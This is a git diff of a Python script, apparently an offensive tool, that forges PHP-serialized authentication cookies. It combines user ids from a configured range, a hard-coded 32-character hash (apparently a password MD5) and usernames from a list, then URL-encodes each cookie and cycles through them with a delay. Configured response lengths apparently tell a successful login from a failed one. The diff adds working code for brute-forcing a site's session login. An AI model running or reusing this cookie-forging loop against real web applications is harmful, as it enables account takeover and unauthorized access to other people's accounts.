@@ -17,6 +17,9 @@ import requests
 import configparser
 import ast
 	
+# for data manipulation (yes that's right!)
+import urllib.parse
+	
 # for visuals
 from etaprogress.progress import ProgressBar
 	
@@ -84,7 +87,7 @@ def main():
 		
 		login_len_false = config[web]["login_len_false"]
 		login_len_true = config[web]["login_len_true"]
-		interval = config[web]["login_interval"]
+		interval = int(config[web]["login_interval"])
 		cookie_base = "{'" + config[web]["user_cookie"] + "': '"
 		
 		assert(len(url))
@@ -125,8 +128,8 @@ def main():
 		## Misc
 		username_count = len(content)
 		
-		id_min = config[web]["user_id_min"]
-		id_max = config[web]["user_id_max"]
+		id_min = int(config[web]["user_id_min"])
+		id_max = int(config[web]["user_id_max"])
 		id_total = (id_max - id_min) + 1
 		assert(id_total > 0)
 		
@@ -148,14 +151,14 @@ def main():
 		# work
 		# >>> range(6)
 		# [0, 1, 2,3,4,5]
-		for i in range(id_work):
+		for i in range(id_total):
 			k = i + id_min
-			for uname in content
-				"""fgood.write(uname + "\n")
-				whatToLog = "[I] "+ uname
+			for uname in content:
+				s = gen_cook_string(k, uname)
+				fgood.write(uname + "\n")
+				whatToLog = "[I] "+ cook_string_to_cookie(s)
 				flog.write(whatToLog+"\n")
 				print(whatToLog)
-				"""
 				time.sleep(interval/1000)
 
 
@@ -163,23 +166,40 @@ def main():
 	
 	
 def gen_cook_string(id, username):
+	idk_todo_recon = "6bcc45cfd3d5ee44c98fc480a167caf8"
 	C34 = chr(34)
 
-	# 0/3
+	# 1/3
 	i0_prefix = "a:3:{i:0;s:"
 	i0_string = str(id)
 	i0_slen = len(i0_string)
 	
-	ret = i0_prefix + i0_slen + ":" + C34 + i0_string + C34 + ";"
+	ret = i0_prefix + str(i0_slen) + ":" + C34 + i0_string + C34 + ";"
 	
+	# 2/3
 	i1_prefix = "i:1;s:"
-	i1_string = "password"
-	i1_slen = len(i0_string)
+	i1_string = idk_todo_recon #md5? Password
+	i1_slen = len(i1_string)
 	
+	assert(i1_slen == 32) # always of len 32. MD5?
 	
+	ret = ret + i1_prefix + str(i1_slen) + ":" + C34 + i1_string + C34 + ";"
 	
+	# 3/3
+	i2_prefix = "i:2;s:" 
+	i2_string = username #md5? Password
+	i2_slen = len(i2_string)
+	
+	ret = ret + i2_prefix + str(i2_slen) + ":" + C34 + i2_string + C34 + ";"
+	
+	# fin
+	ret = ret + "}"
+	
+	return ret
 
 def cook_string_to_cookie(s):
+	return urllib.parse.quote(s)
+
 
 # BEGIN
 if __name__ == '__main__':
